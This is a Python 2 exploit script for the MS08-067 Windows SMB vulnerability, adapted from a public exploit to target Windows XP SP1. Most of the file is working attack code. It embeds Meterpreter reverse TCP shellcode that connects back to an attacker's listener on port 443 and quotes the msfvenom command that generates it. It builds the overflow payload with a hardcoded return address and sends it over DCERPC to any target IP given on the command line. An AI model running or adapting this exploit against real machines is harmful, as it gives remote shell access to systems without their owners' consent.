import struct

import sys



from threading import Thread    #Thread is imported incase you would like to modify

                               



try:

    from impacket import smb

    from impacket import uuid

    from impacket.dcerpc import dcerpc

    from impacket.dcerpc import transport

except ImportError, _:

    print 'Install the following library to make this script work'

    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'

    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'

    sys.exit(1)





print '#######################################################################'

print '#   MS08-067 Exploit'

print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/). It targets Windows XP SP1 English instead of Windows 2000/2003 as in the original code'

print '#   The return address (0x01001361) is taken from metasploit module exploit/windows/smb/ms08_067_netapi'

print '#######################################################################\n'





#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40; 
#Make sure there are enough nops at the begining for the decoder to work
#EXITFUNC=thread Important!
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x29\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e\x81"
shellcode += "\x76\x0e\x1c\xf6\xf9\xda\x83\xee\xfc\xe2\xf4\xe0\x1e"
shellcode += "\x7b\xda\x1c\xf6\x99\x53\xf9\xc7\x39\xbe\x97\xa6\xc9"
shellcode += "\x51\x4e\xfa\x72\x88\x08\x7d\x8b\xf2\x13\x41\xb3\xfc"
shellcode += "\x2d\x09\x55\xe6\x7d\x8a\xfb\xf6\x3c\x37\x36\xd7\x1d"
shellcode += "\x31\x1b\x28\x4e\xa1\x72\x88\x0c\x7d\xb3\xe6\x97\xba"
shellcode += "\xe8\xa2\xff\xbe\xf8\x0b\x4d\x7d\xa0\xfa\x1d\x25\x72"
shellcode += "\x93\x04\x15\xc3\x93\x97\xc2\x72\xdb\xca\xc7\x06\x76"
shellcode += "\xdd\x39\xf4\xdb\xdb\xce\x19\xaf\xea\xf5\x84\x22\x27"
shellcode += "\x8b\xdd\xaf\xf8\xae\x72\x82\x38\xf7\x2a\xbc\x97\xfa"
shellcode += "\xb2\x51\x44\xea\xf8\x09\x97\xf2\x72\xdb\xcc\x7f\xbd"
shellcode += "\xfe\x38\xad\xa2\xbb\x45\xac\xa8\x25\xfc\xa9\xa6\x80"
shellcode += "\x97\xe4\x12\x57\x41\x9e\xca\xe8\x1c\xf6\x91\xad\x6f"
shellcode += "\xc4\xa6\x8e\x74\xba\x8e\xfc\x1b\x09\x2c\x62\x8c\xf7"
shellcode += "\xf9\xda\x35\x32\xad\x8a\x74\xdf\x79\xb1\x1c\x09\x2c"
shellcode += "\xb0\x19\x9e\x39\x72\x34\x91\x91\xd8\x1c\xf7\x42\x53"
shellcode += "\xfa\xa6\xa9\x8a\x4c\xb6\xa9\x9a\x4c\x9e\x13\xd5\xc3"
shellcode += "\x16\x06\x0f\x8b\x9c\xe9\x8c\x4b\x9e\x60\x7f\x68\x97"
shellcode += "\x06\x0f\x99\x36\x8d\xd0\xe3\xb8\xf1\xaf\xf0\x1e\x98"
shellcode += "\xda\x1c\xf6\x93\xda\x76\xf2\xaf\x8d\x74\xf4\x20\x12"
shellcode += "\x43\x09\x2c\x59\xe4\xf6\x87\xec\x97\xc0\x93\x9a\x74"
shellcode += "\xf6\xe9\xda\x1c\xa0\x93\xda\x74\xae\x5d\x89\xf9\x09"
shellcode += "\x2c\x49\x4f\x9c\xf9\x8c\x4f\xa1\x91\xd8\xc5\x3e\xa6"
shellcode += "\x25\xc9\x75\x01\xda\x61\xd4\xa1\xb2\x1c\xb6\xf9\xda"
shellcode += "\x76\xf6\xa9\xb2\x17\xd9\xf6\xea\xe3\x23\xae\xb2\x69"
shellcode += "\x98\xb4\xbb\xe3\x23\xa7\x84\xe3\xfa\xdd\x33\x6d\x09"
shellcode += "\x06\x25\x1d\x35\xd0\x1c\x69\x31\x3a\x61\xfc\xeb\xd3"
shellcode += "\xd0\x74\x50\x6c\x67\x81\x09\x2c\xe6\x1a\x8a\xf3\x5a"
shellcode += "\xe7\x16\x8c\xdf\xa7\xb1\xea\xa8\x73\x9c\xf9\x89\xe3"
shellcode += "\x23\xf9\xda"





class SRVSVC_Exploit(Thread):

    def __init__(self, target, port=445):

        super(SRVSVC_Exploit, self).__init__()

        self.__port   = port

        self.target   = target



    def __DCEPacket(self):

        print '[-]Initiating connection'

        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))

        jumper = "A"*4+"\x61\x13\x00\x01"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10



        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + shellcode +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + "\x08\x04\x02\x00" + "\x61\x13\x00\x01"+ jumper + "\x00" * 2

        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"

        return



    def run(self):

        self.__DCEPacket()

        self.__dce.call(0x1f, self.__stub) 
        print 'Exploit finish\n'



if __name__ == '__main__':

       try:

               target = sys.argv[1]

       except IndexError:

               print '\nUsage: %s <target ip>\n' % sys.argv[0]

               print 'Example: MS08_067.py 192.168.1.1\n'



               sys.exit(-1)



current = SRVSVC_Exploit(target)

current.start()





